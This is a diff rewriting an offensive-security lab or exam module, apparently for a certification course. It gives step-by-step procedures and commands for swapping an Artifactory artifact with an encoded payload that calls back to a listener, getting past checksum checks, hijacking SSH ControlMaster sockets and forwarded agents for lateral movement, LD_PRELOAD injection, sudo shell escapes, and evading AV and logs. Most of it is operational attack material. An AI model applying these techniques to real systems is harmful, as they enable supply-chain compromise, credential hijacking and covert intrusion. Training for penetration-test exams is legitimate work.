+- [ ] Trigger or wait for the consumer pull; confirm the callback
+- [ ] Restore the original artifact before leaving
 
-### Lab files
-- `m13-artifactory-replace.sh`: locate, backup, replace, fix permissions, checksum verify, restore.
-- (Helper) `m13-xor-encoder.py` / `m13-simple-loader.c`: build the replacement as “shell + in-memory payload”.
+Confirm layout and locate the file (common path `/opt/jfrog/artifactory/`):
 
-### Verify
-- After replace, `file`/`readelf`/`sha256sum` match expectations (same arch; business output matches original when required).
-- Listener gets a callback after the consumer’s next pull.
-- Repo side shows no errors (consumer can still parse the artifact; format was not broken).
+```bash
+ps aux | grep artifactory
+# Backup / cred clues: /opt/jfrog/artifactory/var/backup/access (encrypted creds / DB backups),
+# or data dir .../var/data/access/derby (copy out offline if needed).
+file ARTIFACT; readelf -h ARTIFACT    # arch and format — an x86_64 consumer cannot run an arm artifact
+```
 
-### Failure branches / fallbacks
-1. **Cannot find the exact file in storage (metadata split from blobs)**: download via Artifactory’s download API and match checksums; or use backup-store creds to log into the admin API and do a “legitimate upload” overwrite of the same version/path.
-2. **Consumer verifies artifact signature/checksum**: if you cannot bypass, switch to “replace a dependency / secondary file” or “point repo config at another artifact path you control” instead of hard-swapping the main file.
-3. **Arch mismatch → consumer cannot run**: rebuild for the consumer’s arch (`-m64`/`-m32`/arm); `file` the original first.
-4. **Consumer only pulls on a specific trigger (short exam window)**: do whatever active trigger is allowed (kick a build/deploy task, or force one pull from a service the consumer reaches), and ensure the replacement is valid on the first pull.
-5. **Replacement breaks business and ops notices**: prefer wrap mode (run original logic first); keep the restore script ready; restore and clean logs after verify.
+Use `m13-artifactory-replace.sh` for the swap: backup → drop replacement → (if needed) restore owner / mode / metadata → record original checksum. Optionally use `m13-xor-encoder.py` + `m13-simple-loader.c` for an in-memory load shape so the landed artifact has no plaintext payload. Trigger / wait for consumer pull: restart / refresh consumer jobs, or wait for the repo's pull interval. Cleanup: restore the original (`--restore`); tear down the listener and temp files.
 
-### Exam / OPSEC notes
-- Always backup before replace; record the original checksum and compare on restore.
-- Do not delete other repo files or disturb the backup store into a broad alert — keep the change surface small.
-- Inside the session, avoid dropping plaintext tools on the consumer; keep using encode + in-memory load.
-- Restore the original artifact before leaving so later scenarios that depend on the same repo are not broken.
+After replace, `file` / `readelf` / `sha256sum` should match expectations (same arch; business output matches the original when required). A callback after the consumer's next pull, with no repo-side errors, is the check.
 
----
+If you cannot find the exact file in storage (metadata split from blobs), download via Artifactory's download API and match checksums, or use backup-store creds to log into the admin API and do a "legitimate upload" overwrite of the same version / path. If the consumer verifies artifact signature / checksum and you cannot bypass it, switch to replacing a dependency / secondary file, or point repo config at another artifact path you control, instead of hard-swapping the main file.
 
-#### `m13-artifactory-replace.sh`
+If the arch is wrong and the consumer cannot run it, rebuild for the consumer's arch (`-m64` / `-m32` / arm); `file` the original first. If the consumer only pulls on a specific trigger (short exam window), do whatever active trigger is allowed (kick a build / deploy task, or force one pull from a service the consumer reaches), and ensure the replacement is valid on the first pull. If the replacement breaks business and ops notices, prefer wrap mode (run original logic first); keep the restore script ready; restore and clean logs after verify.
+
+Always backup before replace; record the original checksum and compare on restore. Do not delete other repo files or disturb the backup store into a broad alert — keep the change surface small. Inside the session, avoid dropping plaintext tools on the consumer; keep using encode + in-memory load. Restore the original artifact before leaving so later scenarios that depend on the same repo are not broken.
+
+::: details `m13-artifactory-replace.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -1535,59 +1437,61 @@ case "$CMD" in
 esac
 ````
 
-## Scenario 48 · No SSH password, but an already-authenticated reusable connection exists
+:::
 
-### Situation
-You already have a shell as some user on a Linux host (e.g. a web service user, or from an earlier scenario), but **do not know SSH passwords for other users/internal hosts**, and have no ready private key. The environment does have **already-authenticated SSH reuse**: (1) a `ControlMaster` multiplexing socket, and/or (2) a forwarded `ssh-agent`. Reusing them lets you “borrow” the existing auth context and log into other hosts **without password or private-key files**.
 
-### Assumptions
-- You run **as the user who owns the master connection/agent** (the scenario usually places you there; cross-user needs root).
-- ControlMaster: the user’s `~/.ssh/config` has `ControlMaster auto` + `ControlPath` + `ControlPersist`, or an active master connection exists (socket file, e.g. `/home/USER/.ssh/controlmaster/USER@host:22`).
-- Agent: the master used `ForwardAgent yes`, or a local `ssh-agent` already has keys loaded; the agent socket (`/tmp/ssh-XXXX/agent.NNNN`) is readable to you.
-- Target hosts allow that user through these reuse channels (exactly the lateral surface this scenario demonstrates).
+## No SSH password, but a reusable authenticated connection exists
 
-### Prepare (attacker)
-1. Enumerate reusable assets:
-   - ControlMaster sockets: `find ~/.ssh -name 'control*' -o -path '*controlmaster*' 2>/dev/null`, `ls -la ~/.ssh/`, `ps aux | grep 'ssh -M'`, `lsof -U 2>/dev/null | grep -i control` (same-user visible).
-   - Agent: `ls /tmp/ssh-*/agent.* 2>/dev/null`, `echo $SSH_AUTH_SOCK`, `ssh-add -l`.
-2. If config has no ControlMaster but you can write the user’s home and they have an active connection: inject `~/.ssh/config` so later connects reuse (`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`) — see quick-reference notes.
-3. Prepare identity-check commands locally/on target (`id`, `hostname`).
+If you already have a shell as some user on a Linux host but do not know SSH passwords for other users / internal hosts and have no ready private key, look for already-authenticated SSH reuse: a `ControlMaster` multiplexing socket, and/or a forwarded `ssh-agent`. Reusing them lets you borrow the existing auth context and log into other hosts without a password or a private-key file. You must run as the user who owns the master connection / agent (cross-user needs root).
 
-### Procedure
-1. **ControlMaster reuse**: find the socket (e.g. `/home/USER/.ssh/controlmaster/USER@TARGET:22`) and ride it — no password:
-   - `ssh -S /home/USER/.ssh/controlmaster/USER@TARGET:22 USER@TARGET 'id && hostname'`
-   - Or interactive `ssh -S <socket> USER@TARGET`.
-   - Confirm socket naming (config `%h:%p` expansion); `ls` the real filename first.
-2. **Agent-forward borrow**: if your session has a forwarded agent (`$SSH_AUTH_SOCK` points at a readable agent), `ssh-add -l` to see identities; then log into reachable hosts as that user:
-   - `ssh -o StrictHostKeyChecking=no USER@TARGET 'id'` (agent signs; private key never lands).
-3. **Other agent sockets** (same user’s other sessions/processes): point `SSH_AUTH_SOCK` at them and repeat:
-   - `SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh-add -l`
-4. Continue enum/lateral on the landed target; **do not extract private-key files** (with an agent you do not need them; extraction is riskier and often fails — keys in the agent are frequently encrypted).
+- [ ] Enumerate ControlMaster sockets and agent sockets
+- [ ] Ride an active ControlMaster socket (`ssh -S`) — no password
+- [ ] Or point `SSH_AUTH_SOCK` at a readable agent and log into hosts that agent can reach
+- [ ] Continue enum / lateral on the landed target; do not extract private-key files
 
-### Lab files
-- `m13-ssh-controlmaster-hijack.sh`: auto-discover ControlMaster and usable agent sockets, try reuse logins, report successful targets and identities.
+Enumerate reusable assets:
 
-### Verify
-- Reuse command returns target identity: `id`/`hostname` match the master-connection user with no password prompt.
-- Agent borrow can log into hosts corresponding to identities listed by `ssh-add -l`.
-- No password prompts and no `Permission denied (publickey)` errors.
+```bash
+# ControlMaster sockets
+find ~/.ssh -name 'control*' -o -path '*controlmaster*' 2>/dev/null
+ls -la ~/.ssh/
+ps aux | grep 'ssh -M'
+lsof -U 2>/dev/null | grep -i control
+# Agent
+ls /tmp/ssh-*/agent.* 2>/dev/null
+echo $SSH_AUTH_SOCK
+ssh-add -l
+```
 
-### Failure branches / fallbacks
-1. **Stale socket** (connection dead / ControlPersist expired): `ssh -S socket ...` reports `Control socket connect() failed` → do not force it; find an still-active master (`ps aux | grep 'ssh '` for interactive masters), or switch to the agent line.
-2. **Agent identity cannot log into the target** (that user has no rights there, or target is outside the identity’s reach): walk `ssh-add -l` entries; try other usernames/hosts; if hostname is unknown, probe the reachable set first.
-3. **ControlMaster socket name ≠ `%h:%p` expansion**: build `-S` from the real filename under `ls ~/.ssh/controlmaster/`.
-4. **You are not the master-connection user (cross-user)**: without root you cannot read others’ sockets/agents (usually mode 0700) → this is not the scenario entry; find a same-user connection or escalate first.
-5. **Target rejects reuse channels** (`ControlMaster` only one-way): fall back to agent forward; if both fail and you have no creds, this lateral path is not viable — record that clearly instead of slamming it.
+If config has no ControlMaster but you can write the user's home and they have an active connection, inject `~/.ssh/config` so later connects reuse (`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`) — see `m13-ssh-controlmaster-hijack.sh prepare`.
 
-### Exam / OPSEC notes
-- Reusing a connection is cleaner than stealing keys: **do not** `scp` out `id_rsa` or try to crack the agent with `ssh-keygen` (if you have an agent, just use it).
-- Both `ssh -S` and agent borrow leave normal auth logs on the target (`Accepted publickey for ...` from reuse/agent); avoid high-volume scans that spam those logs.
-- Do not kill someone else’s master/agent process (breaks other lab dependencies and exposes you).
-- End with a normal `exit` and let the reuse socket expire via `ControlPersist`.
+ControlMaster reuse — find the socket (e.g. `/home/USER/.ssh/controlmaster/USER@TARGET:22`) and ride it:
 
----
+```bash
+ssh -S /home/USER/.ssh/controlmaster/USER@TARGET:22 USER@TARGET 'id && hostname'
+# Or interactive:
+ssh -S <socket> USER@TARGET
+```
 
-#### `m13-ssh-controlmaster-hijack.sh`
+Confirm socket naming (config `%h:%p` expansion); `ls` the real filename first.
+
+Agent-forward borrow: if your session has a forwarded agent (`$SSH_AUTH_SOCK` points at a readable agent), `ssh-add -l` to see identities, then log into reachable hosts as that user:
+
+```bash
+ssh -o StrictHostKeyChecking=no USER@TARGET 'id'     # agent signs; private key never lands
+# Other agent sockets (same user's other sessions / processes):
+SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh-add -l
+```
+
+`m13-ssh-controlmaster-hijack.sh` auto-discovers ControlMaster and usable agent sockets, tries reuse logins, and reports successful targets and identities. A reuse command returning the target identity (`id` / `hostname` match the master-connection user) with no password prompt is the check. Agent borrow should log into hosts corresponding to identities listed by `ssh-add -l`.
+
+If the socket is stale (connection dead / ControlPersist expired), `ssh -S socket ...` reports `Control socket connect() failed` — do not force it; find a still-active master (`ps aux | grep 'ssh '` for interactive masters), or switch to the agent line. If an agent identity cannot log into the target, walk `ssh-add -l` entries; try other usernames / hosts; if the hostname is unknown, probe the reachable set first.
+
+If the ControlMaster socket name is not a `%h:%p` expansion, build `-S` from the real filename under `ls ~/.ssh/controlmaster/`. If you are not the master-connection user (cross-user), without root you cannot read others' sockets / agents (usually mode 0700) — this is not the scenario entry; find a same-user connection or escalate first. If the target rejects reuse channels (`ControlMaster` only one-way), fall back to agent forward; if both fail and you have no creds, this lateral path is not viable — record that clearly instead of slamming it.
+
+Reusing a connection is cleaner than stealing keys: do not `scp` out `id_rsa` or try to crack the agent with `ssh-keygen` (if you have an agent, just use it). Both `ssh -S` and agent borrow leave normal auth logs on the target (`Accepted publickey for ...`); avoid high-volume scans that spam those logs. Do not kill someone else's master / agent process (breaks other lab dependencies and exposes you). End with a normal `exit` and let the reuse socket expire via `ControlPersist`.
+
+::: details `m13-ssh-controlmaster-hijack.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -1827,38 +1731,18 @@ case "$CMD" in
 esac
 ````
 
-## Quick reference (this module’s command set)
+:::
 
-```bash
-# Encode / load
-python3 m13-xor-encoder.py --key 0x41 -i stage2.bin -o stage2.enc       # file mode
-python3 m13-xor-encoder.py --key 0x41 -i stage2.bin --c-array          # C-array mode (embed)
-gcc -o loader m13-simple-loader.c                                     # business / in-memory modes via macros
 
-# Shared libraries
-gcc -Wall -fPIC -shared -o lib.so m13-shared-library-ldpreload.c -ldl
-gcc -Wall -fPIC -shared -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
-LD_PRELOAD=/path/lib.so TARGET_BIN
-LD_LIBRARY_PATH=/controlled/dir ldd TARGET_BIN
+## Cheat sheet
 
-# sudo escape
-sudo vim -c ':!/bin/sh'
-sudo find . -exec /bin/sh \; -quit
-sudo lua -e 'os.execute("/bin/sh")'
-
-# SSH reuse
-ssh -S /home/USER/.ssh/controlmaster/USER@TARGET:22 USER@TARGET 'id'
-SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh-add -l
-```
-
-## Script inventory ↔ scenarios
-
-| Script | Scenario | Purpose |
-|---|---|---|
-| `m13-xor-encoder.py` | 36/37 | XOR encode/decode payload (file or C array) |
-| `m13-simple-loader.c` | 36/37 | In-memory decode/exec of stage2; business-output / heartbeat mode |
-| `m13-shared-library-ldpreload.c` | 38 | LD_PRELOAD inject `.so` |
-| `m13-shared-library-ldlibrarypath.c` | 38 | Same-name replace for a missing library (LD_LIBRARY_PATH) |
-| `m13-sudo-gtfobins.sh` | 39 | GTFOBins escape when sudo allows a single program |
-| `m13-artifactory-replace.sh` | 40 | Artifact backup / replace / restore |
-| `m13-ssh-controlmaster-hijack.sh` | 48 | Discover and borrow ControlMaster / agent reuse connections |
+| You want to… | Use |
+|---|---|
+| Encode / load a payload in memory | `m13-xor-encoder.py` + `m13-simple-loader.c` |
+| Pass a site business check | loader in business-output / heartbeat mode |
+| Beat Linux AV on a common ELF | XOR + in-memory decode; never land plaintext in `/tmp` |
+| `LD_PRELOAD` inject a `.so` | `m13-shared-library-ldpreload.c` |
+| Same-name replace a missing library | `m13-shared-library-ldlibrarypath.c` + `LD_LIBRARY_PATH` |
+| sudo allows only vim / find / lua / … | `m13-sudo-gtfobins.sh`; `sudo vim -c ':!/bin/sh'` |
+| Overwrite an Artifactory artifact | `m13-artifactory-replace.sh` (backup → replace → restore) |
+| Reuse SSH ControlMaster / agent | `m13-ssh-controlmaster-hijack.sh`; `ssh -S <socket>` |
